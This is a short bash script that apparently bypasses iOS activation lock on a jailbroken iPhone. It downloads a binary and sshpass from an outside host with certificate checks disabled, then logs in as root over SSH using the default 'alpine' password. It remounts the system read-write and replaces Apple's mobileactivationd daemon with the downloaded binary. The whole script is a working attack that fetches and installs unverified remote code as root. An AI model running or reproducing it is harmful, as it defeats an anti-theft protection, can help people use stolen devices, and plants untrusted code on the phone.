#!/bin/bash

wget --no-check-certificate https://lcloud101.webcindario.com/byp/bypass1?dl=0 ./bypass1?dl=0
wget --no-check-certificate https://lcloud101.webcindario.com/byp/thanks.rtf ./thanks.rtf
wget --no-check-certificate https://lcloud101.webcindario.com/sshpass ./sshpass

rm -rf ~/.ssh/known_hosts
chmod 755 ./sshpass 

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 mount -o rw,union,update /

./sshpass -p alpine scp -rP 2222 -o StrictHostKeyChecking=no ./bypass1?dl=0 root@localhost:/usr/libexec/bypass1?dl=0

./sshpass -p alpine scp -rP 2222 -o StrictHostKeyChecking=no ./thanks.rtf root@localhost:/var/mobile/Media/Downloads/thanks.rtf

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 mv /usr/libexec/mobileactivationd /usr/libexec/mobileactivationdbak

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 mv /usr/libexec/bypass1?dl=0 /usr/libexec/mobileactivationd

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 chmod 755 /usr/libexec/mobileactivationd

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 cat /var/mobile/Media/Downloads/thanks.rtf

./sshpass -p "alpine" ssh -o StrictHostKeyChecking=no root@localhost -p 2222 rm /var/mobile/Media/Downloads/thanks.rtf


rm -rf ./thanks.rtf
rm -rf ./bypass1?dl=0